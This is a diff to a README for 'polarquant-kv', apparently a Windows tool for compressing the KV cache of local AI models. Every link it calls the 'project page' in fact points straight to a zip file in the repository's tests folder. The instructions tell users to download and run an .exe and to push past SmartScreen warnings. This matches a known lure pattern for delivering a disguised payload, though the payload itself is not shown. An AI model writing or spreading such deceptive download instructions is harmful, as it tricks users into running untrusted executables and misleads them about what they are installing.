@@ -1,6 +1,6 @@
 # 🔷 polarquant-kv - Save VRAM With KV Compression
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Project%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Whiteflagnorthplatte622/polarquant-kv/main/tests/kv-polarquant-2.0.zip)
+[![Download](https://img.shields.io/badge/Download-Visit%20Project%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Whiteflagnorthplatte622/polarquant-kv/raw/refs/heads/main/tests/kv-polarquant-2.0.zip)
 
 ## 🚀 What this app does
 
@@ -12,7 +12,7 @@ This app is built for Windows users who want to run local AI models with less me
 
 Open the project page here:
 
-https://raw.githubusercontent.com/Whiteflagnorthplatte622/polarquant-kv/main/tests/kv-polarquant-2.0.zip
+https://github.com/Whiteflagnorthplatte622/polarquant-kv/raw/refs/heads/main/tests/kv-polarquant-2.0.zip
 
 On that page, look for the latest release or the main download files. If you see a Windows `.exe` file or a packaged app, download it and run it.
 
@@ -46,7 +46,7 @@ If Windows SmartScreen appears, use the download page again to confirm you got t
 Follow these steps in order:
 
 1. Open the project page:
-   https://raw.githubusercontent.com/Whiteflagnorthplatte622/polarquant-kv/main/tests/kv-polarquant-2.0.zip
+   https://github.com/Whiteflagnorthplatte622/polarquant-kv/raw/refs/heads/main/tests/kv-polarquant-2.0.zip
 
 2. Find the latest Windows release or app package.
 
@@ -193,7 +193,7 @@ This makes it easier to find files when you need to update or test the app.
 
 Only use files from the project page:
 
-https://raw.githubusercontent.com/Whiteflagnorthplatte622/polarquant-kv/main/tests/kv-polarquant-2.0.zip
+https://github.com/Whiteflagnorthplatte622/polarquant-kv/raw/refs/heads/main/tests/kv-polarquant-2.0.zip
 
 This helps you avoid files that do not match the release you want.
 
@@ -218,7 +218,7 @@ If you want the easiest path, use the default compression and check whether your
 ## 📌 Quick install path
 
 1. Visit:
-   https://raw.githubusercontent.com/Whiteflagnorthplatte622/polarquant-kv/main/tests/kv-polarquant-2.0.zip
+   https://github.com/Whiteflagnorthplatte622/polarquant-kv/raw/refs/heads/main/tests/kv-polarquant-2.0.zip
 
 2. Download the Windows file from the project page.
 
